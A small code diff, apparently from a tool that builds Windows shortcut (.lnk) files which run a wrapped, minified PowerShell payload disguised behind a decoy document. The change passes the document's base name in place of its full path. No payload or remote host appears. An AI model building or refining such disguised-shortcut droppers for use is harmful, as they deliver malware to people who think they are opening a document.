@@ -46,7 +46,7 @@ def write_lnk_using_document(target, document, payload, overwrite = False):
         script = minify(
             ps_wrapper.wrap_powershell_script(
                 payload, 
-                path_operations.convert_to_os_specific_path(document.document_path), 
+                os.path.basename(document.document_path), 
                 delimiter.decode("utf-8")
             )
         )
